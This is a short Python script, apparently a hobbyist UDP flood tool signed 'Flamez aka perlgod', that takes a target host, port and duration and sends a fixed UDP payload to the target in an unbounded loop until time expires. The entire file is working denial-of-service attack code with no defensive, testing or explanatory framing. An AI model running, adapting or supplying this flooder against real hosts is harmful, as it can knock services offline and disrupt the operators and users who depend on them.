import socket
import sys
import time

host = sys.argv[1]
puerto = int(sys.argv[2])
tiempo = time.time() + int(sys.argv[3])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
print("Slamming!!! - Made by Flamez aka perlgod")
while True:
    if time.time() > tiempo:
        break;
    s.sendto(payload,(host,puerto))
